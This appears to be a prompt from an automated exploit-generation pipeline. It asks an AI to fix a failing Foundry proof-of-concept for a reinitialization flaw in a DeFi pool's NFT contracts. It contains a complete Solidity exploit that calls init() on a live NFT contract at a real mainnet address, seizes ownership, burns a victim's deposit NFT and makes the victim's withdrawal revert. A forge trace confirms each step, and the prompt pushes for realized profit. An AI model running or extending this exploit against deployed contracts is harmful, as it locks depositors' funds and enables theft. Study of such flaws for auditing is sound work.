You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Anyone can reinitialize the NFT contracts and seize deposit/funding token ownership
- claim: `NFT.init()` is external and has neither a one-time initialization guard nor access control, so any account can call it on an already-deployed deposit or funding NFT clone and transfer contract ownership to itself. The new owner then gains the owner-only `mint`/`burn` powers over the live position NFTs relied on by the pools.
- impact: An attacker can take over a pool's `depositNFT` or `fundingNFT`, burn users' position tokens, block future minting, and break the ownership checks used during withdrawals and funder payouts. This can permanently lock depositor and funder claims and DoS the pool.
- exploit_paths: ["Call `NFT.init(attacker, ...)` on the deployed deposit NFT or funding NFT contract.", "As the new owner, call `burn(tokenId)` on victim deposit/funding NFTs or interfere with future minting.", "Victim `withdraw()` / funder payout paths revert when `ownerOf()` no longer returns a valid holder for the expected NFT."]

Current FlawVerifier.sol:
```solidity
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
}

interface INFTLike {
    function owner() external view returns (address);
    function init(address newOwner, string calldata tokenName, string calldata tokenSymbol) external;
    function ownerOf(uint256 tokenId) external view returns (address);
    function burn(uint256 tokenId) external;
}

interface IDInterestLike {
    struct Deposit {
        uint256 amount;
        uint256 maturationTimestamp;
        uint256 interestOwed;
        uint256 initialMoneyMarketIncomeIndex;
        bool active;
        bool finalSurplusIsNegative;
        uint256 finalSurplusAmount;
        uint256 mintMPHAmount;
        uint256 depositTimestamp;
    }

    struct Funding {
        uint256 fromDepositID;
        uint256 toDepositID;
        uint256 recordedFundedDepositAmount;
        uint256 recordedMoneyMarketIncomeIndex;
        uint256 creationTimestamp;
    }

    function depositNFT() external view returns (address);
    function fundingNFT() external view returns (address);
    function stablecoin() external view returns (address);
    function depositsLength() external view returns (uint256);
    function fundingListLength() external view returns (uint256);
    function getDeposit(uint256 depositID) external view returns (Deposit memory);
    function getFunding(uint256 fundingID) external view returns (Funding memory);
    function depositIsFunded(uint256 depositID) external view returns (bool);
    function withdraw(uint256 depositID, uint256 fundingID) external;
    function earlyWithdraw(uint256 depositID, uint256 fundingID) external;
    function payInterestToFunder(uint256 fundingID) external returns (uint256 interestAmount);
}

contract FlawVerifier {
    address public constant TARGET = 0xF0b7DE03134857391d8D43Ed48e20EDF21461097;

    address private _profitToken;
    uint256 private _profitAmount;

    address public pool;
    uint256 public hijackedTokenId;
    uint256 public linkedFundingId;
    bool public targetIsDepositNFT;
    bool public targetIsFundingNFT;
    bool public hypothesisValidated;
    bool public burnedVictimToken;
    bool public ownerQueryRevertedAfterBurn;
    bool public demonstratedPathRevert;
    bool public usedEarlyWithdraw;
    address public victimOwnerBeforeBurn;
    string public exploitPath;
    string public failureReason;

    constructor() {}

    function executeOnOpportunity() public {
        if (hypothesisValidated || bytes(failureReason).length != 0) {
            return;
        }

        INFTLike nft = INFTLike(TARGET);
        pool = nft.owner();
        if (pool == address(0)) {
            failureReason = "target owner is zero";
            return;
        }

        IDInterestLike market = IDInterestLike(pool);
        address depositNftAddr = market.depositNFT();
        address fundingNftAddr = market.fundingNFT();
        _profitToken = market.stablecoin();
        _profitAmount = IERC20Like(_profitToken).balanceOf(address(this));

        targetIsDepositNFT = depositNftAddr == TARGET;
        targetIsFundingNFT = fundingNftAddr == TARGET;
        if (!targetIsDepositNFT && !targetIsFundingNFT) {
            failureReason = "target NFT not wired into pool";
            return;
        }

        // Path anchor 0: NFT.init(attacker, ...)
        _seizeNftOwnership(nft);
        if (nft.owner() != address(this)) {
            failureReason = "reinitialization failed";
            return;
        }
        hypothesisValidated = true;

        if (targetIsDepositNFT) {
            exploitPath =
                "NFT.init(attacker, ...) -> burn(tokenId) on a live deposit NFT -> victim withdraw()/earlyWithdraw path reverts because ownerOf(tokenId) no longer returns the expected holder";
            _demonstrateDepositPath(market, INFTLike(depositNftAddr));
        } else {
            exploitPath =
                "NFT.init(attacker, ...) -> burn(tokenId) on a live funding NFT -> payInterestToFunder reverts because ownerOf(tokenId) no longer returns the expected holder";
            _demonstrateFundingPath(market, INFTLike(fundingNftAddr));
        }

        _profitAmount = IERC20Like(_profitToken).balanceOf(address(this));
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function triggerWithdraw(address market, uint256 tokenId, uint256 fundingID) external {
        require(msg.sender == address(this), "self only");
        IDInterestLike(market).withdraw(tokenId, fundingID);
    }

    function triggerEarlyWithdraw(address market, uint256 tokenId, uint256 fundingID) external {
        require(msg.sender == address(this), "self only");
        IDInterestLike(market).earlyWithdraw(tokenId, fundingID);
    }

    function triggerPayInterestToFunder(address market, uint256 tokenId) external {
        require(msg.sender == address(this), "self only");
        IDInterestLike(market).payInterestToFunder(tokenId);
    }

    function _seizeNftOwnership(INFTLike nft) internal {
        address attacker = address(this);
        nft.init(attacker, "hijacked", "HIJACKED");
    }

    function _demonstrateDepositPath(IDInterestLike market, INFTLike nft) internal {
        (uint256 tokenId, uint256 fundingID, bool useEarly) = _findDepositCandidate(market, nft);
        if (tokenId == 0) {
            failureReason = "no live deposit NFT candidate found";
            return;
        }

        hijackedTokenId = tokenId;
        linkedFundingId = fundingID;
        usedEarlyWithdraw = useEarly;
        victimOwnerBeforeBurn = nft.ownerOf(tokenId);

        // Path anchor 1: burn(tokenId)
        nft.burn(tokenId);
        burnedVictimToken = true;
        ownerQueryRevertedAfterBurn = _ownerQueryReverts(nft, tokenId);

        // Path anchor 2: victim withdraw() / earlyWithdraw() now fails because ownerOf(tokenId) reverts.
        (bool reverted, ) = useEarly
            ? _callEarlyWithdraw(address(market), tokenId, fundingID)
            : _callWithdraw(address(market), tokenId, fundingID);
        demonstratedPathRevert = reverted;

        if (!ownerQueryRevertedAfterBurn) {
            failureReason = "burn succeeded but ownerOf still resolves";
        } else if (!demonstratedPathRevert) {
            failureReason = "burned deposit NFT but withdraw path did not revert";
        }
    }

    function _demonstrateFundingPath(IDInterestLike market, INFTLike nft) internal {
        uint256 tokenId = _findFundingCandidate(market, nft);
        if (tokenId == 0) {
            failureReason = "no live funding NFT candidate found";
            return;
        }

        hijackedTokenId = tokenId;
        linkedFundingId = tokenId;
        victimOwnerBeforeBurn = nft.ownerOf(tokenId);

        // Path anchor 1: burn(tokenId)
        nft.burn(tokenId);
        burnedVictimToken = true;
        ownerQueryRevertedAfterBurn = _ownerQueryReverts(nft, tokenId);

        (bool reverted, ) = _callPayInterestToFunder(address(market), tokenId);
        demonstratedPathRevert = reverted;

        if (!ownerQueryRevertedAfterBurn) {
            failureReason = "burn succeeded but ownerOf still resolves";
        } else if (!demonstratedPathRevert) {
            failureReason = "burned funding NFT but payout path did not revert";
        }
    }

    function _findDepositCandidate(IDInterestLike market, INFTLike nft)
        internal
        view
        returns (uint256 tokenId, uint256 fundingID, bool useEarly)
    {
        uint256 len = market.depositsLength();
        for (uint256 i = 1; i <= len; i++) {
            if (!_tokenExists(nft, i)) {
                continue;
            }

            IDInterestLike.Deposit memory deposit = market.getDeposit(i);
            if (!deposit.active) {
                continue;
            }

            tokenId = i;
            useEarly = block.timestamp < deposit.maturationTimestamp;
            if (market.depositIsFunded(i)) {
                fundingID = _findFundingForDeposit(market, i);
                if (fundingID == 0) {
                    tokenId = 0;
                    continue;
                }
            }
            return (tokenId, fundingID, useEarly);
        }
    }

    function _findFundingCandidate(IDInterestLike market, INFTLike nft) internal view returns (uint256 tokenId) {
        uint256 len = market.fundingListLength();
        for (uint256 i = 1; i <= len; i++) {
            if (_tokenExists(nft, i)) {
                return i;
            }
        }
    }

    function _findFundingForDeposit(IDInterestLike market, uint256 depositID) internal view returns (uint256) {
        uint256 len = market.fundingListLength();
        for (uint256 fundingID = 1; fundingID <= len; fundingID++) {
            IDInterestLike.Funding memory funding = market.getFunding(fundingID);
            if (depositID > funding.fromDepositID && depositID <= funding.toDepositID) {
                return fundingID;
            }
        }
        return 0;
    }

    function _tokenExists(INFTLike nft, uint256 tokenId) internal view returns (bool) {
        try nft.ownerOf(tokenId) returns (address owner_) {
            return owner_ != address(0);
        } catch {
            return false;
        }
    }

    function _ownerQueryReverts(INFTLike nft, uint256 tokenId) internal view returns (bool) {
        try nft.ownerOf(tokenId) returns (address owner_) {
            return owner_ == address(0);
        } catch {
            return true;
        }
    }

    function _callWithdraw(address market, uint256 tokenId, uint256 fundingID)
        internal
        returns (bool reverted, bytes memory returndata)
    {
        try this.triggerWithdraw(market, tokenId, fundingID) {
            return (false, bytes(""));
        } catch (bytes memory data) {
            return (true, data);
        }
    }

    function _callEarlyWithdraw(address market, uint256 tokenId, uint256 fundingID)
        internal
        returns (bool reverted, bytes memory returndata)
    {
        try this.triggerEarlyWithdraw(market, tokenId, fundingID) {
            return (false, bytes(""));
        } catch (bytes memory data) {
            return (true, data);
        }
    }

    function _callPayInterestToFunder(address market, uint256 tokenId)
        internal
        returns (bool reverted, bytes memory returndata)
    {
        try this.triggerPayInterestToFunder(market, tokenId) {
            return (false, bytes(""));
        } catch (bytes memory data) {
            return (true, data);
        }
    }
}

```

forge stdout (tail):
```
nt: 0, mintMPHAmount: 21218362167715435035 [2.121e19], depositTimestamp: 1614729521 [1.614e9] })
    │   ├─ [2752] 0xF0b7DE03134857391d8D43Ed48e20EDF21461097::ownerOf(9) [staticcall]
    │   │   ├─ [2580] 0xDe71B24FE56358cC0ADfd6f2e0f6D8ed9e2CF634::ownerOf(9) [delegatecall]
    │   │   │   └─ ← [Return] 0xAfD5f60aA8eb4F488eAA0eF98c1C5B0645D9A0A0
    │   │   └─ ← [Return] 0xAfD5f60aA8eb4F488eAA0eF98c1C5B0645D9A0A0
    │   ├─ [19115] 0x904F81EFF3c35877865810CCA9a63f2D9cB7D4DD::getDeposit(9) [staticcall]
    │   │   └─ ← [Return] Deposit({ amount: 5970000000000000000 [5.97e18], maturationTimestamp: 1617173309 [1.617e9], interestOwed: 1633466718881 [1.633e12], initialMoneyMarketIncomeIndex: 1061605537249892153 [1.061e18], active: false, finalSurplusIsNegative: false, finalSurplusAmount: 0, mintMPHAmount: 9750933174110 [9.75e12], depositTimestamp: 1617172118 [1.617e9] })
    │   ├─ [2752] 0xF0b7DE03134857391d8D43Ed48e20EDF21461097::ownerOf(10) [staticcall]
    │   │   ├─ [2580] 0xDe71B24FE56358cC0ADfd6f2e0f6D8ed9e2CF634::ownerOf(10) [delegatecall]
    │   │   │   └─ ← [Return] 0xf01AD7f76DB963b59Ff1947642c6aC85d7eDEbB7
    │   │   └─ ← [Return] 0xf01AD7f76DB963b59Ff1947642c6aC85d7eDEbB7
    │   ├─ [19115] 0x904F81EFF3c35877865810CCA9a63f2D9cB7D4DD::getDeposit(10) [staticcall]
    │   │   └─ ← [Return] Deposit({ amount: 504559227898593340646 [5.045e20], maturationTimestamp: 1625524002 [1.625e9], interestOwed: 901432948349325085 [9.014e17], initialMoneyMarketIncomeIndex: 1061605737208882291 [1.061e18], active: true, finalSurplusIsNegative: false, finalSurplusAmount: 0, mintMPHAmount: 5381078376862078946 [5.381e18], depositTimestamp: 1617747271 [1.617e9] })
    │   ├─ [2685] 0x904F81EFF3c35877865810CCA9a63f2D9cB7D4DD::depositIsFunded(10) [staticcall]
    │   │   └─ ← [Return] false
    │   ├─ [752] 0xF0b7DE03134857391d8D43Ed48e20EDF21461097::ownerOf(10) [staticcall]
    │   │   ├─ [580] 0xDe71B24FE56358cC0ADfd6f2e0f6D8ed9e2CF634::ownerOf(10) [delegatecall]
    │   │   │   └─ ← [Return] 0xf01AD7f76DB963b59Ff1947642c6aC85d7eDEbB7
    │   │   └─ ← [Return] 0xf01AD7f76DB963b59Ff1947642c6aC85d7eDEbB7
    │   ├─ [16076] 0xF0b7DE03134857391d8D43Ed48e20EDF21461097::burn(10)
    │   │   ├─ [15907] 0xDe71B24FE56358cC0ADfd6f2e0f6D8ed9e2CF634::burn(10) [delegatecall]
    │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │        topic 1: 0x000000000000000000000000f01ad7f76db963b59ff1947642c6ac85d7edebb7
    │   │   │   │        topic 2: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │        topic 3: 0x000000000000000000000000000000000000000000000000000000000000000a
    │   │   │   │           data: 0x
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Return]
    │   ├─ [822] 0xF0b7DE03134857391d8D43Ed48e20EDF21461097::ownerOf(10) [staticcall]
    │   │   ├─ [630] 0xDe71B24FE56358cC0ADfd6f2e0f6D8ed9e2CF634::ownerOf(10) [delegatecall]
    │   │   │   └─ ← [Revert] ERC721: owner query for nonexistent token
    │   │   └─ ← [Revert] ERC721: owner query for nonexistent token
    │   ├─ [12084] FlawVerifier::triggerEarlyWithdraw(0x904F81EFF3c35877865810CCA9a63f2D9cB7D4DD, 10, 0)
    │   │   ├─ [11037] 0x904F81EFF3c35877865810CCA9a63f2D9cB7D4DD::earlyWithdraw(10, 0)
    │   │   │   ├─ [822] 0xF0b7DE03134857391d8D43Ed48e20EDF21461097::ownerOf(10) [staticcall]
    │   │   │   │   ├─ [630] 0xDe71B24FE56358cC0ADfd6f2e0f6D8ed9e2CF634::ownerOf(10) [delegatecall]
    │   │   │   │   │   └─ ← [Revert] ERC721: owner query for nonexistent token
    │   │   │   │   └─ ← [Revert] ERC721: owner query for nonexistent token
    │   │   │   └─ ← [Revert] ERC721: owner query for nonexistent token
    │   │   └─ ← [Revert] ERC721: owner query for nonexistent token
    │   ├─ [803] 0xA64BD6C70Cb9051F6A9ba1F163Fdc07E0DfB5F84::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [416] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xA64BD6C70Cb9051F6A9ba1F163Fdc07E0DfB5F84
    ├─ [803] 0xA64BD6C70Cb9051F6A9ba1F163Fdc07E0DfB5F84::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xA64BD6C70Cb9051F6A9ba1F163Fdc07E0DfB5F84)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 12516705 [1.251e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 8057)
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0xDe71B24FE56358cC0ADfd6f2e0f6D8ed9e2CF634.ownerOf
  at 0xF0b7DE03134857391d8D43Ed48e20EDF21461097.ownerOf
  at 0x904F81EFF3c35877865810CCA9a63f2D9cB7D4DD.earlyWithdraw
  at FlawVerifier.triggerEarlyWithdraw
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 123.82ms (38.11ms CPU time)

Ran 1 test suite in 166.72ms (123.82ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 616434)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
